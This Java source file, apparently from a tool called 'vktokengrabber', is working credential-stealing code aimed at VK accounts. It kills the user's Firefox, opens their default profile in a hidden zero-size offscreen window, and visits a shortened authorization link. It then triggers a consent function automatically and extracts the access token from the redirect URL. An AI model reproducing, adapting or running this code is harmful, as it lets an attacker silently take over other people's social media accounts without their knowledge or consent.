package com.github.dedinc.vktokengrabber.browsers;

import java.io.File;

import org.openqa.selenium.Dimension;
import org.openqa.selenium.JavascriptExecutor;
import org.openqa.selenium.Point;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.firefox.FirefoxOptions;
import org.openqa.selenium.firefox.FirefoxProfile;
import org.openqa.selenium.firefox.ProfilesIni;

import com.github.dedinc.vktokengrabber.utils.WebDriver;

public class Firefox {
	public static String grabToken() {
		String username = System.getenv("USERNAME");
		if (!new File("C:\\Users\\" + username + "\\geckodriver.exe").exists()) {
			WebDriver.getFirefoxDriver();;
		}
		System.setProperty("webdriver.gecko.driver", "C:\\Users\\" + username + "\\geckodriver.exe");
		String[] paths = {"C:\\Program Files\\Mozilla Firefox\\firefox.exe", "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe"};
		for (int i = 0; i != paths.length; i++) {
			if (new File(paths[i]).exists()) {
				System.setProperty("webdriver.firefox.bin", paths[i]);
				break;
			}
		}
		try {
			Runtime.getRuntime().exec("taskkill /im firefox.exe /f");
		   } catch (Exception e) {
		}
        ProfilesIni profileIni = new ProfilesIni();
        FirefoxProfile profile = profileIni.getProfile("default-release");
        FirefoxOptions options = new FirefoxOptions();
        options.setProfile(profile);
        FirefoxDriver driver = new FirefoxDriver(options);
		driver.manage().window().setPosition(new Point(99999, 99999));
		driver.manage().window().setSize(new Dimension(0, 0));
		driver.get("https://vk.cc/9Y1vwX");
		JavascriptExecutor js = (JavascriptExecutor) driver;  
		if (driver instanceof JavascriptExecutor) {
			js.executeScript("allow()");
		}		
		try {
			Thread.sleep(1000);
		   } catch (Exception e) {
		}
		String url = driver.getCurrentUrl();
		driver.quit();
		try {
			return "Token: " + url.split("access_token=")[1].split("&")[0];
		   } catch (Exception e ) {
		}
		return null;
     }
}
